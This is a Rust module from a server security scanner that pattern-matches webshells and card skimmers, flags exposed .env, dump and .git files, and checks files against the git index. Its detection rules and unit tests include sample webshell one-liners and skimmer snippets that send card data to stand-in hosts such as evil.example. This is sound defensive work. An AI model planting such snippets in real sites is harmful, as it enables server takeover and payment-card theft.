//! Web code in general: webshell/skimmer patterns in unverified
//! files, exposed files (.env, .git, dumps), git status,
//! detection of other shop systems.
//!
//! Note: this file contains detection patterns for webshells and is
//! flagged as malware by virus scanners (Defender: Perhetshell).
//! Develop only with an AV exclusion for the project directory; in the product
//! the signatures move into signed rule files (main plan 27).

use std::collections::HashSet;
use std::sync::OnceLock;

use regex::bytes::Regex;

use crate::{Category, Ctx, Severity};

struct Rule {
    name: &'static str,
    re: Regex,
    php: bool,
    js: bool,
    strong: bool,
}

fn rules() -> &'static [Rule] {
    static R: OnceLock<Vec<Rule>> = OnceLock::new();
    R.get_or_init(|| {
        let r = |name, pat: &str, php, js, strong| Rule { name, re: Regex::new(pat).expect(name), php, js, strong };
        vec![
            r("eval_decode", r"(?i)\b(?:eval|assert)\s*\(\s*(?:@\s*)?(?:base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13|strrev|hex2bin|rawurldecode|convert_uudecode)\s*\(", true, false, true),
            r("exec_userinput", r"(?i)\b(?:system|shell_exec|passthru|exec|popen|proc_open|pcntl_exec|assert|eval)\s*\(\s*(?:@\s*)?\$_(?:POST|GET|REQUEST|COOKIE|SERVER)", true, false, true),
            r("varfunc_userinput", r"\$_(?:POST|GET|REQUEST|COOKIE)\s*\[[^\]]{1,40}\]\s*\(", true, false, true),
            r("preg_e", r#"(?i)preg_replace\s*\(\s*['"].{1,200}/[a-zA-Z]*e[a-zA-Z]*['"]\s*,"#, true, false, true),
            r("known_shell", r"(?i)FilesMan|WSO\s?(?:shell|[0-9]\.[0-9])|b374k|c99shell|r57shell|IndoXploit|alfa\s?(?:shell|team)|0byt3m1n1|p0wny|weevely", true, true, true),
            r("create_function", r"(?i)\bcreate_function\s*\(", true, false, false),
            r("hex_escaped", r"(?i)(?:\\x[0-9a-f]{2}){24,}", true, true, false),
            r("long_base64", r"[A-Za-z0-9+/]{3000,}={0,2}", true, false, false),
            r("chr_chain", r"(?i)(?:chr\(\s*\d+\s*\)\s*\.\s*){12,}", true, false, false),
            r("upload_write", r"(?i)move_uploaded_file\s*\(\s*\$_FILES.{0,200}\$_(?:POST|GET|REQUEST)", true, false, false),
            r("skimmer_exfil", r"(?is)(?:new\s+WebSocket|navigator\.sendBeacon|new\s+Image\s*\(\s*\)\s*\.src|fetch\s*\().{0,400}(?:cc_?num|card_?number|cardnumber|cvv|cvc|billing\[|payment\[)", false, true, true),
            // skimmer (stage C1): collect checkout fields and send them to a foreign address
            r("skimmer_form_harvest", r"(?is)(?:checkout|onestepcheckout|onepage|payment|billing).{0,300}(?:XMLHttpRequest|sendBeacon|new\s+WebSocket|\.src\s*=|fetch\s*\().{0,300}['\x22]https?://", false, true, true),
            // injected payment form (fake iframe/form)
            r("skimmer_fake_form", r"(?is)document\.createElement\s*\(\s*['\x22](?:iframe|form)['\x22]\s*\).{0,400}(?:card|cc_?num|cvv|expir|payment)", false, true, false),
            // caching card data (before sending)
            r("skimmer_storage", r"(?i)localStorage\.setItem\s*\([^)]{0,80}(?:cc_?num|card_?num|cvv|cvc)", false, true, true),
            // PHP reads payment fields and writes/sends them away
            r("php_cc_capture", r"(?is)\$_(?:POST|REQUEST)\s*\[\s*['\x22](?:payment|cc_?number|card_?number|cc_?cid|cvv|billing)[^\]]{0,40}\].{0,400}(?:file_put_contents|fwrite|mail\s*\(|curl_exec|fsockopen|file_get_contents\s*\(\s*['\x22]https?://)", true, false, true),
            r("js_atob_blob", r#"atob\s*\(\s*['"][A-Za-z0-9+/=]{400,}"#, false, true, false),
            r("js_packer", r"eval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e\s*,\s*[dr]\s*\)", false, true, false),
            r("js_fromcharcode", r"String\.fromCharCode\s*\((?:\s*\d+\s*,){60,}", false, true, false),
        ]
    })
}

fn kind(path: &str) -> (bool, bool) {
    let l = path.to_ascii_lowercase();
    let php = [".php", ".phtml", ".phar", ".php5", ".php7", ".pht", ".inc"].iter().any(|e| l.ends_with(e));
    let js = l.ends_with(".js") || l.ends_with(".html") || l.ends_with(".htm") || l.ends_with(".twig") || l.ends_with(".tpl") || l.ends_with(".phtml");
    (php, js)
}

/// Pattern check of a file. Returns the names of the matched rules;
/// weak rules only count if at least two match.
pub fn scan_file(path: &str) -> Vec<&'static str> {
    let (php, js) = kind(path);
    if !php && !js {
        return vec![];
    }
    let Ok(Some(data)) = tyrosd_core::content::read_limited(path, 2 * 1024 * 1024) else { return vec![] };
    scan_bytes(&data, php, js)
}

pub fn scan_bytes(data: &[u8], php: bool, js: bool) -> Vec<&'static str> {
    let mut strong = Vec::new();
    let mut weak = Vec::new();
    for r in rules() {
        if ((php && r.php) || (js && r.js)) && r.re.is_match(data) {
            if r.strong {
                strong.push(r.name)
            } else {
                weak.push(r.name)
            }
        }
    }
    if !strong.is_empty() || weak.len() >= 2 {
        strong.extend(weak);
        strong
    } else {
        vec![]
    }
}

fn is_strong(name: &str) -> bool {
    rules().iter().any(|r| r.name == name && r.strong)
}

const SKIP_DIRS: &[&str] = &["node_modules", ".git", "cache", ".cache"];

pub fn check(ctx: &mut Ctx) {
    let reported: HashSet<String> = ctx.report.findings.iter().filter_map(|f| f.path.clone()).collect();
    let mut scanned = 0usize;
    let mut hits_total = 0usize;
    let webroots = ctx.cfg.webroots.clone();
    for w in &webroots {
        detect_apps(ctx, w);
        let mut it = walkdir::WalkDir::new(w).follow_links(false).into_iter();
        while let Some(Ok(e)) = it.next() {
            let p = e.path().to_string_lossy().into_owned();
            if e.file_type().is_dir() {
                let n = e.file_name().to_string_lossy();
                if SKIP_DIRS.contains(&n.as_ref()) {
                    if n == ".git" {
                        exposed_git(ctx, &p);
                    }
                    it.skip_current_dir();
                }
                continue;
            }
            if !e.file_type().is_file() {
                continue;
            }
            exposed_file(ctx, &p, e.depth());
            if ctx.verified.contains(&p) || reported.contains(&p) {
                continue;
            }
            let (php, js) = kind(&p);
            if !php && !js {
                continue;
            }
            scanned += 1;
            let hits = scan_file(&p);
            if !hits.is_empty() {
                hits_total += 1;
                let sev = if hits.iter().any(|h| is_strong(h)) { Severity::High } else { Severity::Medium };
                let title = if js && !php { "Suspicious JavaScript code (skimmer pattern)" } else { "Suspicious PHP code (web shell pattern)" };
                ctx.add(sev, Category::Web, "web_pattern", title, Some(p), Some(format!("Pattern: {}", hits.join(", "))));
            }
        }
        // No `git status` as root (critical: git runs commands from the repository
        // configuration) – instead the index is read directly (`gitindex`, without the git program)
        git_check(ctx, w);
    }
    ctx.stat("web_files_pattern_scanned", scanned);
    ctx.stat("web_files_pattern_hits", hits_total);
}

fn detect_apps(ctx: &mut Ctx, w: &str) {
    for e in walkdir::WalkDir::new(w).max_depth(3).follow_links(false).into_iter().flatten() {
        let p = e.path();
        if p.join("vendor/shopware/core").is_dir() || p.join("vendor/shopware/platform").is_dir() {
            ctx.report.notes.push(format!("Shopware detected in {}: reference comparison (Composer) not yet available, pattern scan only so far", p.display()));
        }
        if p.join("app/etc/env.php").is_file() && p.join("bin/magento").is_file() {
            ctx.report.notes.push(format!("Magento detected in {}: reference comparison not yet available, pattern scan only so far", p.display()));
        }
    }
}

fn exposed_file(ctx: &mut Ctx, p: &str, depth: usize) {
    if depth > 3 {
        return;
    }
    let name = p.rsplit('/').next().unwrap_or("").to_ascii_lowercase();
    let archive = name.ends_with(".zip") || name.ends_with(".tar.gz") || name.ends_with(".tgz") || name.ends_with(".tar");
    let (sev, why) = if name == ".env" || name.starts_with(".env.") {
        (Severity::Medium, "Environment file with credentials in the web root")
    } else if name.ends_with(".sql") || name.ends_with(".sql.gz") || name.ends_with(".sql.zip") || name.ends_with(".dump") {
        (Severity::High, "Database dump in the web root")
    } else if (name.starts_with("backup") || name.contains("-backup") || name.starts_with("dump")) && archive {
        (Severity::High, "Backup archive in the web root")
    } else if name.starts_with("adminer") && name.ends_with(".php") {
        (Severity::High, "Adminer (database tool) in the web root")
    } else if name == "phpinfo.php" || name == "info.php" {
        (Severity::Medium, "phpinfo file in the web root")
    } else if name.ends_with(".php.bak") || name.ends_with(".php.old") || name.ends_with(".php~") || name.ends_with(".php.save") {
        (Severity::Medium, "Backup copy of PHP code (may be served as text)")
    } else {
        return;
    };
    ctx.add(sev, Category::Web, "exposed_file", why, Some(p.to_string()), Some("check whether it can be fetched from outside (web server rules)".into()));
}

fn exposed_git(ctx: &mut Ctx, p: &str) {
    ctx.add(Severity::Medium, Category::Web, "exposed_git", "Git directory in the web root", Some(p.to_string()),
        Some("Source code/credentials can be fetched if the web server does not block .git".into()));
}

/// Git repositories (up to depth 3 in the webroot): tracked files that differ from the index or are missing.
/// Reads only `.git/index` (see `gitindex`) – no git program, no repository configuration.
fn git_check(ctx: &mut Ctx, w: &str) {
    for e in walkdir::WalkDir::new(w).max_depth(3).follow_links(false).into_iter().flatten() {
        if !(e.file_type().is_dir() && e.file_name() == ".git") {
            continue;
        }
        let Some(repo) = e.path().parent() else { continue };
        // the webroot itself may be a symlink (set by the admin); inside it `gitindex` follows no symlinks
        let repo = std::fs::canonicalize(repo).map(|p| p.to_string_lossy().into_owned()).unwrap_or_else(|_| repo.to_string_lossy().into_owned());
        let st = match crate::gitindex::status(&repo) {
            Ok(s) => s,
            Err(err) => {
                ctx.stat(&format!("git:{repo}"), format!("not checked: {err}"));
                continue;
            }
        };
        let hint = if crate::gitindex::has_content_filters(&repo) {
            " · repository uses filter/line-ending attributes (e.g. Git LFS) – the difference may also come from that"
        } else {
            ""
        };
        for (i, (p, ch)) in st.changes.iter().enumerate() {
            if i >= 50 {
                break;
            }
            let what = match ch {
                crate::gitindex::Change::Modified => "Content changed",
                crate::gitindex::Change::Deleted => "Deleted",
                crate::gitindex::Change::TypeChanged => "File type changed (file/link/folder)",
            };
            ctx.add(Severity::Medium, Category::Web, "git_modified", "File differs from the Git state", Some(format!("{repo}/{p}")),
                Some(format!("{what} compared to the Git index{hint}")));
        }
        let mut s = format!("{} changed/deleted of {} entries", st.changes.len(), st.entries);
        if st.budget_exhausted {
            s.push_str(" (hash budget exhausted, not all files compared)");
        }
        ctx.stat(&format!("git:{repo}"), s);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn webshells() {
        assert!(!scan_bytes(b"<?php @eval(base64_decode($_POST['x']));", true, false).is_empty());
        assert!(!scan_bytes(b"<?php system($_GET['cmd']); ?>", true, false).is_empty());
        assert!(!scan_bytes(b"<?php $_REQUEST['a']($_REQUEST['b']);", true, false).is_empty());
        assert!(!scan_bytes(b"<?php /* FilesMan */", true, false).is_empty());
    }
    #[test]
    fn clean_php() {
        assert!(scan_bytes(b"<?php echo esc_html( get_the_title() ); $x = base64_decode($y);", true, false).is_empty());
        // a single weak rule is not enough
        assert!(scan_bytes(b"<?php $f = create_function('$a', 'return $a;');", true, false).is_empty());
    }
    #[test]
    fn skimmer() {
        let js = b"var s=new WebSocket('wss://x.example');s.send(JSON.stringify({cardnumber:document.forms[0].cardnumber.value}))";
        assert!(!scan_bytes(js, false, true).is_empty());
    }
}

#[cfg(test)]
mod skimmer_tests {
    use super::*;

    #[test]
    fn skimmer_variants() {
        let harvest = b"if(location.href.indexOf('onestepcheckout')>-1){var x=new XMLHttpRequest();x.open('POST','https://evil.example/c');}";
        assert!(scan_bytes(harvest, false, true).contains(&"skimmer_form_harvest"));
        let storage = b"localStorage.setItem('cc_number', document.getElementById('cc').value)";
        assert!(scan_bytes(storage, false, true).contains(&"skimmer_storage"));
        let php = b"<?php $d=$_POST['payment']['cc_number']; file_put_contents('/tmp/.c', $d, FILE_APPEND);";
        assert!(scan_bytes(php, true, false).contains(&"php_cc_capture"));
        // normal checkout script without sending to a foreign address
        let ok = b"function validateCheckout(){ var f=document.forms.checkout; return f.email.value.length>3; }";
        assert!(scan_bytes(ok, false, true).is_empty());
    }
}
